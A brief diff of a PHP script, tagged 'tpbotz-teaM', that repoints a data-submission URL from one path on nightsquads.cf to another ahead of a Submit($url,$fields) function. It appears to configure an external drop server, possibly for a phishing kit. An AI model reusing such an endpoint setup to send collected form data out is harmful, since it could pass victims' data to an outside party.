@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'tpbotz-teaM',
-           'url'=>'http://nightsquads.cf/getData.php',
+           'url'=>'http://nightsquads.cf/new/getData.php',
             );
 
 function Submit($url,$fields)
